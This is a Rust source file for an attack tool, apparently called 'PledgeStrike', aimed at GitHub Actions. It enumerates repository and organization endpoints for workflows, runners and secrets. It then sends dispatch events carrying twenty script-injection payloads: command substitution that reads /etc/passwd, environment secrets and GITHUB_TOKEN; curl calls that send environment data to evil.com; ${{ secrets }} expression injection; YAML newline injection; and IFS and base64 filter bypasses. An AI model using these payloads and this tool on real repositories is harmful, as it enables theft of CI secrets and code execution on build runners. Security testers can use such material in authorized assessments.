use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64, token: Option<&str>) -> Client {
    let mut builder = Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none());
    if let Some(t) = token {
        builder = builder.default_headers(reqwest::header::HeaderMap::from_iter([(
            reqwest::header::AUTHORIZATION,
            reqwest::header::HeaderValue::from_str(&format!("Bearer {}", t)).unwrap(),
        )]));
    }
    builder.build().unwrap_or_else(|_| Client::new())
}

const GHA_INJECTION_VECTORS: &[(&str, &str, &str)] = &[
    ("PR title — command substitution", "$(whoami)", "pull_request"),
    ("PR title — backticks", "`whoami`", "pull_request"),
    ("PR body — command substitution", "$(cat /etc/passwd)", "pull_request"),
    ("PR body — backticks", "`id`", "pull_request"),
    ("Branch name — command substitution", "$(curl https://evil.com/$(whoami))", "push"),
    ("Branch name — backticks", "`curl https://evil.com`", "push"),
    ("Issue title — command substitution", "$(env | grep SECRET)", "issues"),
    ("Issue body — env exfil", "$(curl https://evil.com/?d=$(env))", "issues"),
    ("Commit message — command substitution", "$(cat $GITHUB_TOKEN)", "push"),
    ("Commit message — backticks", "`printenv`", "push"),
    ("PR title — ${{ }} expression", "${{ secrets.GITHUB_TOKEN }}", "pull_request"),
    ("PR body — ${{ }} env access", "${{ env.GITHUB_TOKEN }}", "pull_request"),
    ("PR title — ${{ }} runner context", "${{ runner.os }}", "pull_request"),
    ("Branch name — ${{ }} secrets", "${{ secrets.SIGNING_KEY }}", "push"),
    ("Issue body — ${{ }} strategy context", "${{ strategy.job-index }}", "issues"),
    ("PR title — newline injection", "test\n  - run: curl https://evil.com", "pull_request"),
    ("PR body — YAML injection", "test\n  - run: cat $GITHUB_ENV", "pull_request"),
    ("Branch name — semgrep bypass", "$(echo${IFS}evil)", "push"),
    ("Commit message — IFS bypass", "test${IFS}&&${IFS}whoami", "push"),
    ("PR title — base64 exec", "$(echo d2hvYW1p | base64 -d)", "pull_request"),
];

const WORKFLOW_ENDPOINTS: &[(&str, &str)] = &[
    ("Workflows API", "/repos/{repo}/actions/workflows"),
    ("Workflow runs", "/repos/{repo}/actions/runs"),
    ("Workflow jobs", "/repos/{repo}/actions/jobs"),
    ("Artifacts", "/repos/{repo}/actions/artifacts"),
    ("Cache", "/repos/{repo}/actions/cache"),
    ("Runners", "/repos/{repo}/actions/runners"),
    ("Org runners", "/orgs/{org}/actions/runners"),
    ("Self-hosted runners", "/repos/{repo}/actions/runners?labels=self-hosted"),
    ("Environment secrets", "/repos/{repo}/environments/{env}/secrets"),
    ("Repo secrets", "/repos/{repo}/actions/secrets"),
    ("Org secrets", "/orgs/{org}/actions/secrets"),
    ("Variables", "/repos/{repo}/actions/variables"),
    ("OIDC", "/repos/{repo}/actions/oidc"),
    ("Permissions", "/repos/{repo}/actions/permissions"),
    ("Workflow file", "/repos/{repo}/contents/.github/workflows"),
];

pub async fn inject(repo: &str, token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
    println!("{} GitHub Actions Injection Suite", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Repo: {}", "[*]".cyan().bold(), repo);
    println!("{} {} injection vectors, {} API endpoints", "[*]".cyan().bold(), GHA_INJECTION_VECTORS.len(), WORKFLOW_ENDPOINTS.len());
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout, token);
    let api_base = "https://api.github.com";

    println!("\n{} [1/2] GitHub Actions API enumeration...", "[*]".cyan().bold());
    let mut found = Vec::new();
    for (name, path) in WORKFLOW_ENDPOINTS {
        let url = format!("{}{}", api_base, path.replace("{repo}", repo).replace("{org}", &repo.split('/').next().unwrap_or(repo)));
        match client.get(&url).header("Accept", "application/vnd.github+json").header("User-Agent", "PledgeStrike").send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                let accessible = status == 200;
                let has_secrets = body.contains("secrets") || body.contains("SECRET");
                let has_runners = body.contains("runner") || body.contains("self-hosted");
                let has_workflows = body.contains("workflow") || body.contains("runs");
                let tag = if accessible {
                    if has_secrets { "SECRETS".red().bold().to_string() }
                    else if has_runners { "RUNNERS".red().bold().to_string() }
                    else if has_workflows { "WORKFLOWS".green().bold().to_string() }
                    else { "accessible".green().to_string() }
                } else if status == 404 {
                    "not found".dimmed().to_string()
                } else if status == 401 || status == 403 {
                    "auth".yellow().to_string()
                } else {
                    format!("status {}", status)
                };
                println!("  {} {:25} status={} {}", "*".cyan(), name, status, tag);
                if accessible {
                    found.push(*name);
                    if has_secrets || has_runners {
                        println!("    {} {}", ">".red().bold(), body.chars().take(200).collect::<String>());
                    }
                }
            }
            Err(_) => {
                println!("  {} {:25} error", "*".red(), name);
            }
        }
    }

    println!("\n{} [2/2] Script injection payloads...", "[*]".cyan().bold());
    println!("  {} Testing {} injection vectors...", "*".cyan(), GHA_INJECTION_VECTORS.len());
    let mut results = Vec::new();

    for (name, payload, trigger) in GHA_INJECTION_VECTORS {
        let webhook_url = format!("https://api.github.com/repos/{}/dispatches", repo);
        let body = serde_json::json!({
            "event_type": "pledgestrike_test",
            "client_payload": {
                "injection_vector": name,
                "payload": payload,
                "trigger": trigger,
            }
        });

        match client.post(&webhook_url)
            .header("Accept", "application/vnd.github+json")
            .header("User-Agent", "PledgeStrike")
            .header("Content-Type", "application/json")
            .body(body.to_string())
            .send()
            .await
        {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let resp_body = resp.text().await.unwrap_or_default();
                let dispatched = status == 204;
                let has_error = resp_body.contains("error") || resp_body.contains("invalid");
                let tag = if dispatched {
                    "DISPATCHED".red().bold().to_string()
                } else if status == 401 || status == 403 {
                    "auth".yellow().to_string()
                } else if status == 404 {
                    "not found".dimmed().to_string()
                } else if has_error {
                    "rejected".green().to_string()
                } else {
                    format!("status {}", status)
                };
                println!("  {} [{:02}] {:40} trigger={:12} {}", "*".cyan(), results.len() + 1, name, trigger, tag);
                if dispatched {
                    results.push(*name);
                }
            }
            Err(_) => {
                println!("  {} [{:02}] {:40} error", "*".red(), results.len() + 1, name);
            }
        }
    }

    println!(
        "\n{} {} API endpoints accessible, {} / {} injection vectors dispatched",
        "[*]".cyan().bold(),
        found.len(),
        results.len(),
        GHA_INJECTION_VECTORS.len()
    );

    let has_secrets = found.iter().any(|n| n.contains("secret") || n.contains("Secret"));
    let has_runners = found.iter().any(|n| n.contains("runner") || n.contains("Runner"));
    if has_secrets {
        println!("{} [CRITICAL] Actions secrets accessible — credential extraction possible!", "[!]".red().bold());
    }
    if has_runners {
        println!("{} [HIGH] Self-hosted runners detected — runner takeover possible!", "[!]".red().bold());
    }
    if !results.is_empty() {
        let has_expr = results.iter().any(|n| n.contains("${{"));
        let has_cmd = results.iter().any(|n| n.contains("command") || n.contains("backtick") || n.contains("IFS") || n.contains("base64"));
        let has_yaml = results.iter().any(|n| n.contains("newline") || n.contains("YAML"));
        if has_expr {
            println!("{} [CRITICAL] ${{{{}}}} expression injection — secret exfiltration via PR/issue!", "[!]".red().bold());
        }
        if has_cmd {
            println!("{} [CRITICAL] Command substitution injection — RCE on runner!", "[!]".red().bold());
        }
        if has_yaml {
            println!("{} [HIGH] YAML injection — workflow file modification!", "[!]".red().bold());
        }
    }

    Ok(())
}
